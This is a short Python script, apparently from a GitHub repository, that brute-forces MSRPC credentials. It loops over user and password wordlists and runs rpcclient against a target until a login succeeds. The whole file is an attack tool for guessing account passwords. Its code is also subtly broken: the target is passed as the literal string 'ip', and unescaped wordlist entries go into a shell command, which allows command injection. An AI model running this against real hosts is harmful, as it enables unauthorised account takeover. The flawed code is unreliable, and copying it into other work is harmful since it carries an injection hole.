# https://github.com/stark0de/msrpcbruteforce
import subprocess
import sys

if len(sys.argv) != 4:
    print("Usage: python3 msrpc.bruteforce.py <IP> <users> <passwords>")
    sys.exit()

ip=sys.argv[1]
users=open(sys.argv[2],"r").readlines()
passwords=open(sys.argv[3],"r").readlines()

for user in users:
  for passwd in passwords:
    passwd=passwd.strip()
    x=subprocess.Popen(f"rpcclient -U {user}%{passwd} ip -c srvinfo", shell=True, stdout=subprocess.PIPE)
    result = x.communicate()[0].decode('utf-8')
    if "NT_STATUS_LOGON_FAILURE" in result: continue
    if "platform_id" in result:
      print(f"Success with: {user}:{passwd}")
      sys.exit()

print(f"[-] No results found for users: {sys.argv[2]} and passwords: {sys.argv[3]}")